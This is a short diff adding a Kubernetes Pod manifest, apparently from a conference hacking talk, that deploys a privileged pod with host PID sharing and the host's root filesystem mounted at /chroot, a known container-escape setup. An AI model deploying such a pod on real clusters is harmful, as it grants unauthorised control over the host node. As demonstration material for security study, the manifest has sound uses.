@@ -1,0 +1,24 @@
+# Simple example of deploying a privileged pod, with a host volume mount, shared
+# host PID using your image. Works with many other images besides "brick" make
+# sure to change the image page. 
+apiVersion: v1
+kind: Pod
+metadata:
+  name: brick-privpod
+spec:
+  containers:
+  - name: brick
+    hostPID: true
+    image: gcr.io/shmoocon-talk-hacking/brick
+    volumeMounts:
+      - mountPath: /chroot
+        name: host
+  securityContext:
+    runAsUser: 999
+    privileged: true
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+
